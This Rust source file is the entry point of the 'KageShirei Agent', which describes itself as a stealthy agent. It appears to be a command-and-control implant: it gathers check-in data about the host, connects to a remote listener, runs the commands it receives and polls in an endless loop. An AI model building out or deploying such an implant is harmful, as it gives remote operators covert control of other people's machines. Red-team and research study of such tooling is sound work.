//! # KageShirei Agent
//!
//! The KageShirei Agent is a modular, stealthy, and extensible agent of KS.

pub mod command;
pub mod common;
pub mod setup;

extern crate alloc;
use alloc::sync::Arc;

use command::handler::command_handler;
use common::utils::downcast_rightmost_u128;
use kageshirei_runtime::Runtime;
use mod_agentcore::instance;
use mod_win32::nt_time::wait_until;
use setup::{
    communication::initialize_protocol,
    runtime_manager::initialize_runtime,
    system_data::initialize_checkin_data,
};

fn main() {
    let rt = initialize_runtime();
    initialize_checkin_data();
    routine(rt);
}

pub fn routine<R>(rt: Arc<R>)
where
    R: Runtime,
{
    #[allow(
        clippy::infinite_loop,
        reason = "Intentional infinite loop to handle commands and maintain connection"
    )]
    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                initialize_protocol(rt.clone());
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler(rt.clone());
            }

            wait_until(downcast_rightmost_u128(instance().config.polling_interval));
        }
    }
}
